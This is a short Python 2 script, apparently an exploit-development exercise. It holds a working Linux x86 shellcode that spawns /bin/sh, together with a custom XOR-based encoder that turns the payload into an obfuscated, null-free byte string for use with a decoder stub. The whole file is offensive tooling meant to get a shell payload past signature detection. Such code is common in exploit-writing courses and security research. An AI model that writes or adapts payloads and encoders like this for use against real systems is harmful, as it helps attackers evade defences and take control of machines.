#!/usr/bin/python

import random

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode):
	y = x ^ 0xDE
	z = y ^ 0xAD
	encoded += '0x%02x,' %y
	if z == 0:
		encoded += '0xad,'
	else:
		encoded += '0x%02x,' %z

print encoded

print 'Len: %d' % len(bytearray(shellcode))

